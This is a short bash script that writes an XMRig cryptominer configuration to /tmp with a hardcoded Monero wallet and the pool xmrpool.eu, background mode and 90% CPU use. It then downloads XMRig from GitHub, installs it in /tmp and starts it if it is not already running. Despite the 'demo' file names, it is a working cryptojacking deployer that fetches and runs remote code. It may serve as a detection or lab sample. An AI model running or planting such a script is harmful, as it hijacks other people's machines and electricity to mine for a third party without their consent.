#!/bin/bash

echo '{
    "algo": "cryptonight",
    "api": {
        "port": 0,
        "access-token": null,
        "id": null,
        "worker-id": null,
        "ipv6": false,
        "restricted": true
    },
    "asm": true,
    "autosave": true,
    "av": 0,
    "background": true,
    "colors": true,
    "cpu-affinity": null,
    "cpu-priority": null,
    "donate-level": 5,
    "huge-pages": true,
    "hw-aes": null,
    "log-file": null,
    "max-cpu-usage": 90,
    "pools": [
        {
            "url": "xmrpool.eu:9999",
            "user": "47dYNn4sBHcfs7u7WeoKK3KrCVuwboPG3bXCKzA2negDiHNB1CSEfNd9F92MRjr2Ch3HNMh8Z9xSUgXFFkGTBro92ZbmzxP",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "variant": -1,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null
        }
    ],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "safe": false,
    "threads": [
        {
            "low_power_mode": 1,
            "affine_to_cpu": false,
            "asm": true
        }
    ],
    "user-agent": null,
    "syslog": false,
    "watch": true
}' >> /tmp/config-demo.json
echo '#!/usr/bin/env bash

if [ ! -f /tmp/xmrig-demo ]; then
        echo "[INFO] XMRig not found, downloading XMRig now"
        curl https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-focal-x64.tar.gz -L -o ./xmrig-demo.gz
        tar -xzf xmrig-demo.gz
        mv xmrig-6.19.2/xmrig /tmp/xmrig-demo
        chmod +x /tmp/xmrig-demo
else
        echo "[INFO] XMRig present, skipping download"
fi

if [ $(ps -ef | grep -v grep | grep xmrig-demo | awk '{print $2}'| wc -l) = "0" ]; then
        echo "[INFO] XMRig not running, starting now"
        /tmp/xmrig-demo -c /tmp/config-demo.json
else
        echo "[INFO] XMRig already running"
fi' >> xmrig-demo-install.sh
chmod +x xmrig-demo-install.sh
./xmrig-demo-install.sh
